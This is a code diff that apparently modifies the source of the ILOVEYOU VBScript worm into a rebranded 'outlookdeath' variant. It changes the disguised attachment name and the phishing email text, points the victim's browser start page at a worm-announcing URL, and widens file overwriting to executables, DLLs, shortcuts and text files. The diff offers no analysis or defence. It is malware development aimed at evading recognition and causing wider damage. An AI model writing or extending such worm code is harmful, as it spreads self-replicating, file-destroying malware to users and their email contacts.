@@ -37,7 +37,7 @@ Sub main()
   rem LOVE-LETTER-FOR-YOU.TXT.vbs
   c.Copy(dirsystem & "\MSKernel32.vbs")
   c.Copy(dirwin & "\Win32DLL.vbs")
-  c.Copy(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
+  c.Copy(dirsystem & "\message-from-outlook-mail.TXT.vbs")
 
   regruns()
   html()
@@ -88,7 +88,7 @@ Sub regruns()
     rem Add WIN-BUGSFIX.exe to run on startup
     regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX", downread & "\WIN-BUGSFIX.exe"
     rem Update Internet Explorer's start page to "about:blank"
-    regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\StartPage", "about:blank"
+    regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\StartPage", "https://you-have-been-a-victim-of-the-outlookdeath-worm.glitch.me/"
   End If
 End Sub
 
@@ -129,12 +129,13 @@ Sub infectfiles(folderspec)
       ap.write vbscopy
       ap.close
     rem Copies itself into every file with js/jse/css/wsh/sct/hta extension.
-    ElseIf (ext = "js")
-      Or (ext = "jse")
-      Or (ext = "css")
-      Or (ext = "wsh")
-      Or (ext = "sct")
-      Or (ext = "hta")
+    ElseIf (ext = "txt")
+      Or (ext = "js")
+      Or (ext = "exe")
+      Or (ext = "js")
+      Or (ext = "dat")
+      Or (ext = "dll")
+      Or (ext = "lnk")
     Then
       Set ap = fso.OpenTextFile(f1.path, 2, true)
 
@@ -287,9 +288,9 @@ Sub spreadtoemail()
           Set male = out.CreateItem(0)
 
           male.Recipients.Add(malead)
-          male.Subject = "ILOVEYOU"
-          male.Body = vbcrlf & "kindly check the attached LOVELETTER coming from me."
-          male.Attachments.Add(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
+          male.Subject = "Please read the attached letter"
+          male.Body = vbcrlf & "Please open the important letter."
+          male.Attachments.Add(dirsystem & "\message-from-outlook-mail.TXT.vbs")
           male.Send
 
           regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, 1, "REG_DWORD"
